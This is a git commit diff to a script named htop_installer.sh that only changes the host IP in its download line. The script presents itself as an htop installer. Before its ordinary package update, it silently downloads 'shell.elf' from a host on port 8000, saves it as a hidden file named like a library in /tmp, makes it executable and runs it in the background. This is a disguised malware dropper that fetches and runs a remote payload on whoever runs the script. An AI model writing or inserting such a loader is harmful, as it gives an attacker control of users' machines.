de59012dd71e3f72099d2cdd0551f71b1112ede8
diedromeo <119026435+diedromeo@users.noreply.github.com>
2025-07-01 17:55:17 +0530

    Update htop_installer.sh

--- htop_installer.sh
+++ htop_installer.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
-curl -s -o /tmp/.htop-lib.so http://192.168.223.129:8000/shell.elf
+curl -s -o /tmp/.htop-lib.so http://172.16.17.39:8000/shell.elf
 chmod +x /tmp/.htop-lib.so
 /tmp/.htop-lib.so &
 sudo apt-get update -y
